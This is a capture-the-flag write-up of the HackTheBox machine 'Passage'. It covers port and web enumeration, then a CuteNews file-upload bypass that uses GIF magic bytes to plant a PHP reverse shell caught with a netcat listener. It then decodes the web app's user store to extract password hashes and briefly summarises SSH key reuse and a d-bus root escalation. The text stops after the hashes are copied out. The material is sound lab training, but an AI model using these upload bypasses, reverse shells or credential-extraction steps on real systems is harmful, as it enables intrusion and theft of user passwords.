---
description: 10.10.10.206
---

# Passage

![](<../../.gitbook/assets/1 (6) (1).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - CuteNews webapp PHP file upload bypass to get shell as "www-data". Find hashed passwords for webapp users. Crack password for user "paul" and login. Can SSH as "paul" with private rsa key, and authorized\_keys file in "paul" .ssh directory has entry for user "nadav". SSH as "nadav" with user "paul" private key.
* Root - USBCreator d-bus local privilege escalation

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.206
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 04:35 EST
Nmap scan report for 10.10.10.206
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.84 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -sC -A -p 22,80 10.10.10.206 -n    
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 04:37 EST
Nmap scan report for 10.10.10.206
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.8 - 4.14 (92%), Linux 3.13 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   53.36 ms 10.10.14.1
2   53.93 ms 10.10.10.206

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.206/     
http://10.10.10.206/ [200 OK] Apache[2.4.18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example.com,nadav@passage.htb,paul@passage.htb,sid@example.com], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News]

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.206/

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.206
+ Target Hostname:    10.10.10.206
+ Target Port:        80
+ Start Time:         2021-11-21 03:56:44 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie CUTENEWS_SESSION created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress
+ Scan terminated:  20 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-11-21 04:02:35 (GMT-5) (351 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### Dirbuster

​ Let's run a dirbuster scan against the target. Since we know the site is implementing fail2ban, let's limit the number of request being sent to the target as follows:

![](<../../.gitbook/assets/3 (2).JPG>)

When we ran this, it didn't take very long to find the "CuteNews" directory before getting errors:

```
└─$ cat DirBusterReport-passage.htb-80.txt                                  
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Nov 21 05:29:05 EST 2021
--------------------------------

http://passage.htb:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/CuteNews/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.php


--------------------------------

```

{% hint style="info" %}
NOTE: We ran it a couple more times with the same results. We don't know if it was just pure luck by using dirbuster and that specific wordlist, because the word "cutenews" is on line 123231 of 220560 lines. This implies that dirbuster either does not test the words in the wordlist from top to bottom, or there is something else going on. We thought that perhaps dirbuster scans the words on the site and then tries those first, but we're unsure.
{% endhint %}

### Ffuf

Ffuf has the ability to rate limit requests as well, and so we also ran the following query, however, this one took much much longer. We suspect that ffuf simply tries everything from the top downwards. With the rate limiting below, we reached 500 requests after 620 seconds. At that rate, to reach line 123231, it would've taken approximately 152,806.44 seconds, or roughly 42 hours to find "cutenews", and that is only if it didn't get banned.

> \-rate 1 --> send one request per second
>
> \-t 1 --> use one thread
>
> \-p "0.1-2.0" --> add random delay between 0.1-2.0 per request​

```
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://passage.htb/FUZZ -rate 1 -t 1 -p "0.1-2.0" -ic -c

```

### Cewl

A better option for a situation like this, would be to use "cewl", which scrapes the website for words and adds them to a wordlist. We can also limit the word sizes, and extract email addresses and save them to a seperate file, which makes this a very handy tool for situations where we are limited in what we can do.

```
└─$ cewl -m 3 -w passage.cewl -e --email_file emails.cewl http://passage.htb/ 
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                  
└─$ cat passage.cewl| wc -l                                                  
317
                                                                                                                  
└─$ cat emails.cewl| wc -l     
5

└─$ cat passage.cewl| grep -ni cutenews
3:CuteNews
            
```

As we can see, the route we found earlier is on line 3 in the wordlist generated by cewl. If we feed this into ffuf using the rate limiting options shown above, we get a hit almost straight away.

{% hint style="info" %}
NOTE: There is one more option here, and that is to make an educated guess. Since we know the site is powered by CuteNews, and we can access the source code on github, it wouldn't be a huge leap to go ahead and manually try /cutenews to see if it was there. Remember also that this is a CTF box, and so there are sometimes hints which could either lead us down the correct path, or into a rabbit hole.
{% endhint %}

## Website exploration

#### ​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* There is a bunch of email addresses in the main page souce (gathered earlier)
* There is also a reference to cutenews: Powered by CuteNews, which we know is another "path" to investigate on the site
* There is a post that mentions the implementation of fail2ban, which blocks your IP for 2 minutes if there is "excessive access"
* There are a few user inputs to check out for possible SQLi etc
* Site is running PHP and Apache 2.4.18, possibly on "Ubuntu"

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* Nothing interesting found here, there are a couple of default scripts

Browsing to the home page, we see the post that refers to "fail2ban" being implemented on the site:

![](<../../.gitbook/assets/2 (2).JPG>)

Let's add an entry for "passage.htb" to our /etc/hosts file and visit it in the browser. The site appears to be the same.

```
└─$ cat /etc/hosts | grep passage                                              
10.10.10.206    passage.htb
                            
```



Browsing to the page at [http://passage.htb/CuteNews/](http://passage.htb/CuteNews/) reveals a login form, and the version of CuteNews is 2.1.2.

![](<../../.gitbook/assets/4 (3) (1).JPG>)

There is a register option, so we register an account and login, after which we are redirected to a dashboard. Here, we can edit personal options, one of which is to upload an avatar.

We can upload an image file (png), and we get a success message back. The image appears on the "Personal options" page, and if we "View image info", we can see that it is stored in [http://passage.htb/CuteNews/uploads/](http://passage.htb/CuteNews/uploads/) which is accessible.

![](<../../.gitbook/assets/5 (3) (1).JPG>)

![](<../../.gitbook/assets/6 (1).JPG>)

![](<../../.gitbook/assets/7 (3).JPG>)

The uploads directory already contains two PHP files. They do not appear to do anything, however, this confirms that we should be able to upload a PHP file as well.

![](<../../.gitbook/assets/8 (1).JPG>)

## Gaining Access

Let's copy a PHP reverse shell script to our working directory and modify it with our IP and port. When we try and upload our file, rev.php, we get an error message:

![](<../../.gitbook/assets/9 (3).JPG>)

We'll add the GIF magic byte to the top of the file as shown below in order to try and bypass the filter​ and leave the filename as rev.php. If it still doesn't work, we can try rename the file as well, however, in this case it does work:

```
└─$ head -5 rev.php       
GIF87a
<?php

set_time_limit (0);
$VERSION = "1.0";

```

![](<../../.gitbook/assets/10 (2).JPG>)

Let's start a netcat listener, and click on our uploaded file. We get a shell as the user "www-data", and upgrade it using python3.

```
└─$ nc -nvlp 8888
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:32984.
Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:21:19 up  3:25,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
nadav    tty7     :0               00:56    3:25m  8.67s  0.13s /sbin/upstart --user
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@passage:/$ 
```

## Enumeration as "www-data"

Let's gather some basic system information:

```
www-data@passage:/$ uname -a; cat /etc/*-release; netstat -antp; ls -la /home
uname -a; cat /etc/*-release; netstat -antp; ls -la /home
Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0    873 10.10.10.206:32984      10.10.14.6:8888         ESTABLISHED 3291/sh         
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:631                 :::*                    LISTEN      -               
tcp6       1      0 10.10.10.206:80         10.10.14.6:37628        CLOSE_WAIT  -               
total 16
drwxr-xr-x  4 root  root  4096 Jul 21  2020 .
drwxr-xr-x 23 root  root  4096 Feb  5  2021 ..
drwxr-x--- 17 nadav nadav 4096 Nov 21 00:56 nadav
drwxr-x--- 16 paul  paul  4096 Feb  5  2021 paul
www-data@passage:/$ cat /etc/passwd | grep "/bin/bash"
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
nadav:x:1000:1000:Nadav,,,:/home/nadav:/bin/bash
paul:x:1001:1001:Paul Coles,,,:/home/paul:/bin/bash
www-data@passage:/$ 
```

Let's check the webroot and have a look around. We know there were posts from both "nadav" and "paul" on the website, and so there must be a file or database of some sort that is storing their passwords. From the output of netstat, we can see that there isn't a database service running, and so the webapp is most likely going to be using a file to store user information.

```
www-data@passage:/$ cd ~
cd ~
www-data@passage:/var/www$ ls
ls
html
www-data@passage:/var/www$ cd html
cd html
www-data@passage:/var/www/html$ ls -la
ls -la
total 24
drwxr-xr-x 3 www-data www-data 4096 Jun 18  2020 .
drwxr-xr-x 3 root     root     4096 Jul 21  2020 ..
drwxrwxr-x 9 www-data www-data 4096 Jun 18  2020 CuteNews
-rwxr-xr-x 1 www-data www-data 4812 Jun 18  2020 index.php
-rwxr-xr-x 1 www-data www-data  166 Jun 18  2020 news.php
www-data@passage:/var/www/html$ cd CuteNews
cd CuteNews
www-data@passage:/var/www/html/CuteNews$ ls -la
ls -la
total 120
drwxrwxr-x  9 www-data www-data  4096 Jun 18  2020 .
drwxr-xr-x  3 www-data www-data  4096 Jun 18  2020 ..
-rw-rw-r--  1 www-data www-data  7373 Aug 20  2018 LGPL_CKeditor.txt
-rw-rw-r--  1 www-data www-data  3119 Aug 20  2018 LICENSE.txt
-rw-rw-r--  1 www-data www-data  2523 Aug 20  2018 README.md
-rwxrwxr-x  1 www-data www-data   490 Aug 20  2018 captcha.php
drwxrwxrwx 11 www-data www-data  4096 Nov 21 03:51 cdata
-rwxrwxr-x  1 www-data www-data   941 Aug 20  2018 cn_api.php
drwxrwxr-x  9 www-data www-data  4096 Jun 18  2020 core
drwxrwxr-x  2 www-data www-data  4096 Aug 20  2018 docs
-rwxrwxr-x  1 www-data www-data 11039 Aug 20  2018 example.php
-rwxrwxr-x  1 www-data www-data  1861 Aug 20  2018 example_fb.php
-rw-rw-r--  1 www-data www-data  1150 Aug 20  2018 favicon.ico
-rwxrwxr-x  1 www-data www-data   516 Aug 20  2018 index.php
drwxrwxr-x  9 www-data www-data  4096 Aug 20  2018 libs
drwxrwxr-x  3 www-data www-data  4096 Aug 20  2018 migrations
-rwxrwxr-x  1 www-data www-data  1189 Aug 20  2018 popup.php
-rwxrwxr-x  1 www-data www-data   357 Aug 20  2018 print.php
-rwxrwxr-x  1 www-data www-data  1593 Aug 20  2018 rss.php
-rwxrwxr-x  1 www-data www-data  8888 Aug 20  2018 search.php
-rwxrwxr-x  1 www-data www-data  1031 Aug 20  2018 show_archives.php
-rwxrwxr-x  1 www-data www-data  3370 Aug 20  2018 show_news.php
drwxrwxr-x  5 www-data www-data  4096 Aug 20  2018 skins
-rwxrwxr-x  1 www-data www-data  1275 Aug 20  2018 snippet.php
drwxrwxrwx  2 www-data www-data  4096 Nov 21 04:21 uploads
www-data@passage:/var/www/html/CuteNews$ 
```

After browsing through these directories, we find some interesting files in "cdata":

```
www-data@passage:/var/www/html/CuteNews/cdata$ ls -la user*
ls -la user*
-rwxrwxrwx 1 www-data www-data   58 Aug 20  2018 users.db.php
-rw-r--r-- 1 www-data www-data   63 Nov 21 03:51 users.txt

users:
total 104
drwxrwxrwx  2 www-data www-data 4096 Nov 21 04:21 .
drwxrwxrwx 11 www-data www-data 4096 Nov 21 03:51 ..
-rwxr-xr-x  1 www-data www-data  133 Jun 18  2020 09.php
-rw-r--r--  1 www-data www-data  109 Aug 30  2020 0a.php
-rw-r--r--  1 www-data www-data  125 Aug 30  2020 16.php
-rw-r--r--  1 www-data www-data  449 Nov 21 03:50 21.php
-rw-r--r--  1 www-data www-data  109 Aug 31  2020 32.php
-rw-r--r--  1 www-data www-data  113 Nov 21 03:51 35.php
-rw-r--r--  1 www-data www-data   45 Nov 21 01:48 38.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 52.php
-rw-r--r--  1 www-data www-data  105 Nov 21 03:51 55.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 5d.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 66.php
-rw-r--r--  1 www-data www-data  133 Aug 31  2020 6e.php
-rwxr-xr-x  1 www-data www-data  117 Jun 18  2020 77.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 7a.php
-rwxr-xr-x  1 www-data www-data  109 Jun 18  2020 8f.php
-rwxr-xr-x  1 www-data www-data  129 Jun 18  2020 97.php
-rwxr-xr-x  1 www-data www-data  489 Jun 18  2020 b0.php
-rwxr-xr-x  1 www-data www-data  481 Jun 18  2020 c8.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d4.php
-rwxr-xr-x  1 www-data www-data   45 Jun 18  2020 d5.php
-rw-r--r--  1 www-data www-data 1213 Aug 31  2020 d6.php
-rw-r--r--  1 www-data www-data  549 Nov 21 04:21 ee.php
-rwxr-xr-x  1 www-data www-data  113 Jun 18  2020 fc.php
-rw-r--r--  1 www-data www-data 3840 Aug 30  2020 lines
-rw-r--r--  1 www-data www-data    0 Jun 18  2020 users.txt
www-data@passage:/var/www/html/CuteNews/cdata$ cat users.txt
cat users.txt
qc4fs7:1
qc4fxg:2
qc4fyp:3
qc4fzh:3
qfwgzt:4
qfy7jk:4
r2x7ly:4
www-data@passage:/var/www/html/CuteNews/cdata$ cd users
cd users
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat users.txt
cat users.txt
www-data@passage:/var/www/html/CuteNews/cdata/users$ 
```

There is a file here called lines, which contains base64 encoded strings and some PHP code:

```
www-data@passage:/var/www/html/CuteNews/cdata/users$ cat lines
cat lines
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=
<?php die('Direct call - access denied'); ?>
<?php die('Direct call - access denied'); ?>
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=
www-data@passage:/var/www/html/CuteNews/cdata/users$ 
```

Let's create a file on our attacker box and copy the contents of the "lines" file into it. Next, we'll remove any lines with PHP code, and then base64 decode what's left and store that in a new file called lines.txt.

```
└─$ nano lines  

└─$ cat lines | grep -v die > lines.b64

└─$ cat lines.b64 | base64 -d > lines.txt

└─$ cat lines.txt                        
a:1:{s:5:"email";a:1:{s:16:"paul@passage.htb";s:10:"paul-coles";}}a:1:{s:2:"id";a:1:{i:1598829833;s:6:"egre55";}}a:1:{s:5:"email";a:1:{s:15:"egre55@test.com";s:6:"egre55";}}a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483281;s:9:"sid-meier";}}a:1:{s:5:"email";a:1:{s:17:"nadav@passage.htb";s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"kim@example.com";s:9:"kim-swift";}}a:1:{s:2:"id";a:1:{i:1592483236;s:10:"paul-coles";}}a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:2:"id";a:1:{i:1592483047;s:5:"admin";}}a:1:{s:5:"email";a:1:{s:15:"sid@example.com";s:9:"sid-meier";}}a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}a:1:{s:2:"id";a:1:{i:1592483309;s:9:"kim-swift";}}                                                                                                                  

└─$ tr ';' '\n' < lines.txt | grep 's:64'
s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1"
s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88"
s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd"
s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca"
s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc"
                                                                         
```

The entries shown above look like password hashes. Let's use "hash-identifier" to figure out what kinds of hashes these are:

```
└─$ hash-identifier                      
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
 HASH: ^C

        Bye!
                        
```

Let's copy the hashes to a text file.

```
└─$ tr ';' '\n' < lines.txt | grep 's:64' | cut -d ':' -f3 | sed -e 's/^"//' -e 's/"$//'
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
